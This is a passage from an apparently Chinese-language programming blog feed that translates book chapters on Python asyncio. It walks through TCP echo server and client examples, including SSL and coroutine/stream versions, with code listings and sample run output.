class="line">echo_::<span class="number">1</span>_53957: sent <span class="string">b'This is the message. '</span></div><div class="line">echo_::<span class="number">1</span>_53957: received <span class="string">b'It will be sent in parts.'</span></div><div class="line">echo_::<span class="number">1</span>_53957: sent <span class="string">b'It will be sent in parts.'</span></div><div class="line">echo_::<span class="number">1</span>_53957: message terminated, closing connection</div><div class="line">$ python3 asyncio_echo_client_ssl.py</div><div class="line">asyncio: Using selector: KqueueSelector</div><div class="line">echo_client: connecting to localhost port <span class="number">10000</span></div><div class="line">echo_client: sending <span class="string">b'This is the message. '</span></div><div class="line">echo_client: sending <span class="string">b'It will be sent '</span></div><div class="line">echo_client: sending <span class="string">b'in parts.'</span></div><div class="line">echo_client: waiting <span class="keyword">for</span> response</div><div class="line">echo_client: received <span class="string">b'This is the message. '</span></div><div class="line">echo_client: received <span class="string">b'It will be sent in parts.'</span></div><div class="line">echo_client: closing</div><div class="line">main: closing event loop</div></pre></td></tr></table></figure></p><h3 id="附上完整源码"><a href="#附上完整源码" class="headerlink" title="附上完整源码"></a>附上完整源码</h3><p>TCP Echo Server：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=UTF-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> logging</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> ssl</div><div class="line"></div><div class="line">logging.basicConfig(</div><div class="line">    level=logging.DEBUG,</div><div class="line">    format=<span class="string">'%(name)s: %(message)s'</span>,</div><div class="line">    stream=sys.stderr,</div><div class="line">)</div><div class="line">log = logging.getLogger(<span class="string">'main'</span>)</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">(reader, writer)</span>:</span></div><div class="line">    address = writer.get_extra_info(<span class="string">'peername'</span>)</div><div class="line">    log = logging.getLogger(<span class="string">'echo_&#123;&#125;_&#123;&#125;'</span>.format(*address))</div><div class="line">    log.debug(<span class="string">'connection accepted'</span>)</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        data = <span class="keyword">await</span> reader.read(<span class="number">128</span>)</div><div class="line">        terminate = data.endswith(<span class="string">b'\x00'</span>)</div><div class="line">        data = data.rstrip(<span class="string">b'\x00'</span>)</div><div class="line">        <span class="keyword">if</span> data:</div><div class="line">            log.debug(<span class="string">'received &#123;!r&#125;'</span>.format(data))</div><div class="line">            writer.write(data)</div><div class="line">            <span class="keyword">await</span> writer.drain()</div><div class="line">            log.debug(<span class="string">'sent &#123;!r&#125;'</span>.format(data))</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data <span class="keyword">or</span> terminate:</div><div class="line">            log.debug(<span class="string">'message terminated, closing connection'</span>)</div><div class="line">            writer.close()</div><div class="line">            <span class="keyword">return</span></div><div class="line"></div><div class="line">SERVER_ADDRESS = (<span class="string">'localhost'</span>, <span class="number">10000</span>)</div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"></div><div class="line">ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)</div><div class="line">ssl_context.check_hostname = <span class="keyword">False</span></div><div class="line">ssl_context.load_cert_chain(<span class="string">'pymotw.crt'</span>, <span class="string">'pymotw.key'</span>)</div><div class="line"></div><div class="line">factory = asyncio.start_server(echo, *SERVER_ADDRESS, ssl=ssl_context)</div><div class="line"></div><div class="line">server = event_loop.run_until_complete(factory)</div><div class="line">log.debug(<span class="string">'starting up on &#123;&#125; port &#123;&#125;'</span>.format(*SERVER_ADDRESS))</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_forever()</div><div class="line"><span class="keyword">except</span> KeyboardInterrupt:</div><div class="line">    <span class="keyword">pass</span></div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    log.debug(<span class="string">'closing server'</span>)</div><div class="line">    server.close()</div><div class="line">    event_loop.run_until_complete(server.wait_closed())</div><div class="line">    log.debug(<span class="string">'closing event loop'</span>)</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p>TCP Echo Client：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=UTF-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> logging</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> ssl</div><div class="line"></div><div class="line">MESSAGES = [</div><div class="line">    <span class="string">b'This is the message. '</span>,</div><div class="line">    <span class="string">b'It will be sent '</span>,</div><div class="line">    <span class="string">b'in parts.'</span>,</div><div class="line">]</div><div class="line"></div><div class="line"></div><div class="line">logging.basicConfig(</div><div class="line">    level=logging.DEBUG,</div><div class="line">    format=<span class="string">'%(name)s: %(message)s'</span>,</div><div class="line">    stream=sys.stderr,</div><div class="line">)</div><div class="line">log = logging.getLogger(<span class="string">'main'</span>)</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">echo_client</span><span class="params">(address, messages)</span>:</span></div><div class="line">    log = logging.getLogger(<span class="string">'echo_client'</span>)</div><div class="line">    log.debug(<span class="string">'connecting to &#123;&#125; port &#123;&#125;'</span>.format(*address))</div><div class="line">    ssl_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH,)</div><div class="line">    ssl_context.check_hostname = <span class="keyword">False</span></div><div class="line">    ssl_context.load_verify_locations(<span class="string">'pymotw.crt'</span>)</div><div class="line">    reader, writer = <span class="keyword">await</span> asyncio.open_connection(*address, ssl=ssl_context)</div><div class="line">    <span class="keyword">for</span> msg <span class="keyword">in</span> messages:</div><div class="line">        writer.write(msg)</div><div class="line">        log.debug(<span class="string">'sending &#123;!r&#125;'</span>.format(msg))</div><div class="line">    writer.write(<span class="string">b'\x00'</span>)</div><div class="line">    <span class="keyword">await</span> writer.drain()</div><div class="line">    log.debug(<span class="string">'waiting for response'</span>)</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        data = <span class="keyword">await</span> reader.read(<span class="number">128</span>)</div><div class="line">        <span class="keyword">if</span> data:</div><div class="line">            log.debug(<span class="string">'received &#123;!r&#125;'</span>.format(data))</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            log.debug(<span class="string">'closing'</span>)</div><div class="line">            writer.close()</div><div class="line">            <span class="keyword">return</span></div><div class="line"></div><div class="line">SERVER_ADDRESS = (<span class="string">'localhost'</span>, <span class="number">10000</span>)</div><div class="line">event_loop = asyncio.get_event_loop()</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(</div><div class="line">        echo_client(SERVER_ADDRESS, MESSAGES)</div><div class="line">    )</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    log.debug(<span class="string">'closing event loop'</span>)</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><p><strong>本文翻译自《The Python3 Standard Library By Example》asyncio相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio之使用协程和流的异步I/O</title>
      <link href="/2017/12/21/asyncio%E4%B9%8B%E4%BD%BF%E7%94%A8%E5%8D%8F%E7%A8%8B%E5%92%8C%E6%B5%81%E7%9A%84%E5%BC%82%E6%AD%A5I-O/"/>
      <url>/2017/12/21/asyncio%E4%B9%8B%E4%BD%BF%E7%94%A8%E5%8D%8F%E7%A8%8B%E5%92%8C%E6%B5%81%E7%9A%84%E5%BC%82%E6%AD%A5I-O/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>使用协程和流的异步I/O</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>本节将继续实现简单回显服务器和客户端的两个示例程序的备用版本，使用协程和asyncio的流API而不是上一节的协议和传输类抽象。这些示例的操作比先前讨论的协议API的抽象级别要低，但是正在处理的事件是相似的。</p><h3 id="Echo-Server"><a href="#Echo-Server" class="headerlink" title="Echo Server"></a>Echo Server</h3><p>服务器通过导入设置所需的模块asyncio和logging来启动，然后创建一个事件循环对象。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> logging</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">SERVER_ADDRESS = (<span class="string">'localhost'</span>, <span class="number">10000</span>)</div><div class="line">logging.basicConfig(</div><div class="line">    level=logging.DEBUG,</div><div class="line">    format=<span class="string">'%(name)s: %(message)s'</span>,</div><div class="line">    stream=sys.stderr,</div><div class="line">)</div><div class="line">log = logging.getLogger(<span class="string">'main'</span>)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div></pre></td></tr></table></figure></p><p>然后定义一个协程来处理通信，每次客户端连接时，将调用协程的新实例，以便在该函数内代码一次只与一个客户端进行通信。Python的语言运行时管理每个协程实例的状态，所以应用程序代码不需要管理任何额外的数据结构来跟踪不同的客户端。<br>协程的参数是与新连接关联的StreamReader和StreamWriter实例。和Transport一样，可以通过特殊的方法get_extra_info()来访问客户端地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">(reader, writer)</span>:</span></div><div class="line">    address = writer.get_extra_info(<span class="string">'peername'</span>)</div><div class="line">    log = logging.getLogger(<span class="string">'echo_&#123;&#125;_&#123;&#125;'</span>.format(*address))</div><div class="line">    log.debug(<span class="string">'connection accepted'</span>)</div></pre></td></tr></table></figure></p><p>虽然在建立连接时调用协程，但是可能没有任何数据要读取。为避免在读取时被阻塞，协程使用await和read()调用来等待，以允许事件循环继续处理其他任务，直到有数据要读取为止。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    data = <span class="keyword">await</span> reader.read(<span class="number">128</span>)</div></pre></td></tr></table></figure></p><p>如果客户端发送数据，它将从await中返回，并通过将其传递给写入器而返回给客户端。可以使用多个write()调用来缓冲输出数据，然后使用drain()来刷新结果。由于刷新网络I/O可以阻塞，再次await用于恢复对事件循环的控制，该事件循环监视写入socket并在可以发送更多数据时调用写入器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> data:</div><div class="line">    log.debug(<span class="string">'received &#123;!r&#125;'</span>.format(data))</div><div class="line">    writer.write(data)</div><div class="line">    <span class="keyword">await</span> writer.drain()</div><div class="line">    log.debug(<span class="string">'sent &#123;!r&#125;'</span>.format(data))</div></pre></td></tr></table></figure></p><p>如果客户端没有发送数据，则read()返回一个空的字节字符串，表示连接已关闭。服务器需要关闭写入客户端的socket，然后协程可以返回以表明它已经完成。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">else</span>:</div><div class="line">    log.debug(<span class="string">'closing'</span>)</div><div class="line">    writer.close()</div><div class="line">    <span class="keyword">return</span></div></pre></td></tr></table></figure></p><p>有两个步骤来启动服务器。首先，应用程序告诉事件循环使用协程和主机名以及要监听的socket创建一个新的服务器对象。start_server()方法本身就是一个协程，所以结果必须由事件循环处理才能真正启动服务器。完成协程会生成绑定到事件循环的asyncio.Server实例。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">factory = asyncio.start_server(echo, *SERVER_ADDRESS)</div><div class="line">server = event_loop.run_until_complete(factory)</div><div class="line">log.debug(<span class="string">'starting up on &#123;&#125; port &#123;&#125;'</span>.format(*SERVER_ADDRESS))</div></pre></td></tr></table></figure></p><p>然后，需要运行事件循环才能处理事件并处理客户端请求。对于长期运行的服务，run_forever()方法是最简单的方法。当事件循环停止时，通过应用程序代码或通过发信号通知进程，可以关闭服务器并正确的清理socket，然后在程序退出之前关闭事件循环以完成处理任何其他协程。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_forever()</div><div class="line"><span class="keyword">except</span> KeyboardInterrupt:</div><div class="line">    <span class="keyword">pass</span></div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    log.debug(<span class="string">'closing server'</span>)</div><div class="line">    server.close()</div><div class="line">    event_loop.run_until_complete(server.wait_closed())</div><div class="line">    log.debug(<span class="string">'closing event loop'</span>)</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><h3 id="Echo-Client"><a href="#Echo-Client" class="headerlink" title="Echo Client"></a>Echo Client</h3><p>使用协程来构建客户端与构建服务器非常相似。代码再次通过导入设置所需的模块asyncio和logging来启动，然后创建一个事件循环对象。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> logging</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">MESSAGES = [</div><div class="line">    <span class="string">b'This is the message. '</span>,</div><div class="line">    <span class="string">b'It will be sent '</span>,</div><div class="line">    <span class="string">b'in parts.'</span>,</div><div class="line">]</div><div class="line">SERVER_ADDRESS = (<span class="string">'localhost'</span>, <span class="number">10000</span>)</div><div class="line"></div><div class="line">logging.basicConfig(</div><div class="line">    level=logging.DEBUG,</div><div class="line">    format=<span class="string">'%(name)s: %(message)s'</span>,</div><div class="line">    stream=sys.stderr,</div><div class="line">)</div><div class="line">log = logging.getLogger(<span class="string">'main'</span>)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div></pre></td></tr></table></figure></p><p>echo_client协程使用参数告诉它服务器在哪里以及要发送什么消息。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">echo_client</span><span class="params">(address, messages)</span>:</span></div></pre></td></tr></table></figure></p><p>协程在任务启动时被调用，但是它没有活动的连接来处理。因此，第一步是让客户建立自己的连接。它使用await来避免在open_connection()协程运行时阻塞其他活动。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">log = logging.getLogger(<span class="string">'echo_client'</span>)</div><div class="line">log.debug(<span class="string">'connecting to &#123;&#125; port &#123;&#125;'</span>.format(*address))</div><div class="line">reader, writer = <span class="keyword">await</span> asyncio.open_connection(*address)</div></pre></td></tr></table></figure></p><p>open_connection()协程返回与新socket关联的StreamReader和StreamWriter实例。下一步是使用写入器将数据发送到服务器。与在服务器中一样，写入器将缓冲输出数据，直到socket准备就绪，或使用drain()来刷新结果。由于刷新网络I /O可以阻塞，再次等待用于恢复对事件循环的控制，该事件循环监视写入socket并在可以发送更多数据时调用写入器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> msg <span class="keyword">in</span> messages:</div><div class="line">    writer.write(msg)</div><div class="line">    log.debug(<span class="string">'sending &#123;!r&#125;'</span>.format(msg))</div><div class="line"><span class="keyword">if</span> writer.can_write_eof():</div><div class="line">    writer.write_eof()</div><div class="line"><span class="keyword">await</span> writer.drain()</div></pre></td></tr></table></figure></p><p>接下来，客户端通过尝试读取数据来查找来自服务器的响应，直到没有数据可读的为止。为避免单个read()调用阻塞，await将控制权限交给了事件循环。如果服务器已经发送数据，则会被记录。如果服务器没有发送数据，则read()返回一个空的字节字符串，表示连接已关闭。客户端需要关闭socket才能发送到服务器，然后返回以表明它已经完成。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">log.debug(<span class="string">'waiting for response'</span>)</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    data = <span class="keyword">await</span> reader.read(<span class="number">128</span>)</div><div class="line">    <span class="keyword">if</span> data:</div><div class="line">        log.debug(<span class="string">'received &#123;!r&#125;'</span>.format(data))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        log.debug(<span class="string">'closing'</span>)</div><div class="line">        writer.close()</div><div class="line">        <span class="keyword">return</span></div></pre></td></tr></table></figure></p><p>要启动客户端，使用协程来调用事件循环来创建客户端。使用run_until_complete()可以避免在客户端程序中产生无限循环。与协议示例不同，当协程完成时，不需要单独的future来发信号，因为echo_client()包含所有的客户端逻辑本身，并且只有在收到响应并关闭服务器连接之后才会返回。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(</div><div class="line">        echo_client(SERVER_ADDRESS, MESSAGES)</div><div class="line">    )</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    log.debug(<span class="string">'closing event loop'</span>)</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>在一个窗口中运行服务器，在另一个窗口中运行客户端将生成以下输出。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_echo_client_coroutine.py</div><div class="line">asyncio: Using selector: KqueueSelector</div><div class="line">echo_client: connecting to localhost port <span class="number">10000</span></div><div class="line">echo_client: sending <span class="string">b'This is the message. '</span></div><div class="line">echo_client: sending <span class="string">b'It will be sent '</span></div><div class="line">echo_client: sending <span class="string">b'in parts.'</span></div><div class="line">echo_client: waiting <span class="keyword">for</span> response</div><div class="line">echo_client: received <span class="string">b'This is the message. It will be sent in parts.'</span></div><div class="line">echo_client: closing</div><div class="line">main: closing event loop</div><div class="line"></div><div class="line">$ python3 asyncio_echo_client_coroutine.py</div><div class="line">asyncio: Using selector: KqueueSelector</div><div class="line">echo_client: connecting to localhost port <span class="number">10000</span></div><div class="line">echo_client: sending <span class="string">b'This is the message. '</span></div><div class="line">echo_client: sending <span class="string">b'It will be sent '</span></div><div class="line">echo_client: sending <span class="string">b'in parts.'</span></div><div class="line">echo_client: waiting <span class="keyword">for</span> response</div><div class="line">echo_client: received <span class="string">b'This is the message. It will be sent in parts.'</span></div><div class="line">echo_client: closing</div><div class="line">main: closing event loop</div><div class="line"></div><div class="line">$ python3 asyncio_echo_client_coroutine.py</div><div class="line">asyncio: Using selector: KqueueSelector</div><div class="line">echo_client: connecting to localhost port <span class="number">10000</span></div><div class="line">echo_client: sending <span class="string">b'This is the message. '</span></div><div class="line">echo_client: sending <span class="string">b'It will be sent '</span></div><div class="line">echo_client: sending <span class="string">b'in parts.'</span></div><div class="line">echo_client: waiting <span class="keyword">for</span> response</div><div class="line">echo_client: received <span class="string">b'This is the message. It will be sent '</span></div><div class="line">echo_client: received <span class="string">b'in parts.'</span></div><div class="line">echo_client: closing</div><div class="line">main: closing event loop</div></pre></td></tr></table></figure></p><p>虽然客户端总是单独发送消息，但客户端运行服务器的前两次会收到一条大消息，并将消息回送给客户端。这些结果在后续运行中会有所不同，具体取决于网络的繁忙程度以及在准备好所有数据之前是否刷新网络缓冲区。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_echo_server_coroutine.py</div><div class="line">asyncio: Using selector: KqueueSelector</div><div class="line">main: starting up on localhost port <span class="number">10000</span></div><div class="line">echo_::<span class="number">1</span>_64624: connection accepted</div><div class="line">echo_::<span class="number">1</span>_64624: received <span class="string">b'This is the message. It will be sent in parts.'</span></div><div class="line">echo_::<span class="number">1</span>_64624: sent <span class="string">b'This is the message. It will be sent in parts.'</span></div><div class="line">echo_::<span class="number">1</span>_64624: closing</div><div class="line"></div><div class="line">echo_::<span class="number">1</span>_64626: connection accepted</div><div class="line">echo_::<span class="number">1</span>_64626: received <span class="string">b'This is the message. It will be sent in parts.'</span></div><div class="line">echo_::<span class="number">1</span>_64626: sent <span class="string">b'This is the message. It will be sent in parts.'</span></div><div class="line">echo_::<span class="number">1</span>_64626: closing</div><div class="line"></div><div class="line">echo_::<span class="number">1</span>_64627: connection accepted</div><div class="line">echo_::<span class="number">1</span>_64627: received <span class="string">b'This is the message. It will be sent '</span></div><div class="line">echo_::<span class="number">1</span>_64627: sent <span class="string">b'This is the message. It will be sent '</span></div><div class="line">echo_::<span class="number">1</span>_64627: received <span class="string">b'in parts.'</span></div><div class="line">echo_::<span class="number">1</span>_64627: sent <span class="string">b'in parts.'</span></div><div class="line">echo_::<span class="number">1</span>_64627: closing</div></pre></td></tr></table></figure></p><h3 id="其他实例"><a href="#其他实例" class="headerlink" title="其他实例"></a>其他实例</h3><p>上面作者提供的例子稍微有些复杂，还有一些其他实现Echo服务器和客户端的方式，下面是笔者自己收集的一些代码示例，供大家参看。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">echo_server</span><span class="params">(address)</span>:</span></div><div class="line">    sock = socket(AF_INET, SOCK_STREAM)</div><div class="line">    sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, <span class="number">1</span>)</div><div class="line">    sock.bind(address)</div><div class="line">    sock.listen(<span class="number">5</span>)</div><div class="line">    sock.setblocking(<span class="keyword">False</span>)</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        client, addr = <span class="keyword">await</span> loop.sock_accept(sock)</div><div class="line">        print(<span class="string">"connect from "</span>, addr)</div><div class="line">        loop.create_task(echo_handler(client))</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">echo_handler</span><span class="params">(client)</span>:</span></div><div class="line">    <span class="keyword">with</span> client:</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                data = <span class="keyword">await</span> loop.sock_recv(client, <span class="number">10000</span>)</div><div class="line">                <span class="keyword">if</span> <span class="keyword">not</span> data:</div><div class="line">                    <span class="keyword">break</span></div><div class="line">                <span class="keyword">await</span> loop.sock_sendall(client, str.encode(<span class="string">"Got: "</span>) + data)</div><div class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">                client.close()</div><div class="line">                print(<span class="string">"connection closed"</span>)</div><div class="line">                <span class="keyword">break</span></div><div class="line">    print(<span class="string">"connection closed"</span>)</div><div class="line"></div><div class="line">loop = asyncio.get_event_loop()</div><div class="line">loop.create_task(echo_server((<span class="string">'0.0.0.0'</span>, <span class="number">25000</span>)))</div><div class="line">loop.run_forever()</div></pre></td></tr></table></figure></p><p>aysncio官方文档提供的两个示例：<br>TCP Echo Server：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">import asyncio</div><div class="line"></div><div class="line">async def handle_echo(reader, writer):</div><div class="line">    data = await reader.read(100)</div><div class="line">    message = data.decode()</div><div class="line">    addr = writer.get_extra_info(&apos;peername&apos;)</div><div class="line">    print(&quot;Received %r from %r&quot; % (message, addr))</div><div class="line"></div><div class="line">    print(&quot;Send: %r&quot; % message)</div><div class="line">    writer.write(data)</div><div class="line">    await writer.drain()</div><div class="line"></div><div class="line">    print(&quot;Close the client socket&quot;)</div><div class="line">    writer.close()</div><div class="line"></div><div class="line">loop = asyncio.get_event_loop()</div><div class="line">coro = asyncio.start_server(handle_echo, &apos;127.0.0.1&apos;, 8888, loop=loop)</div><div class="line">server = loop.run_until_complete(coro)</div><div class="line"></div><div class="line"># Serve requests until Ctrl+C is pressed</div><div class="line">print(&apos;Serving on &#123;&#125;&apos;.format(server.sockets[0].getsockname()))</div><div class="line">try:</div><div class="line">    loop.run_forever()</div><div class="line">except KeyboardInterrupt:</div><div class="line">    pass</div><div class="line"></div><div class="line"># Close the server</div><div class="line">server.close()</div><div class="line">loop.run_until_complete(server.wait_closed())</div><div class="line">loop.close()</div></pre></td></tr></table></figure></p><p>TCP Echo 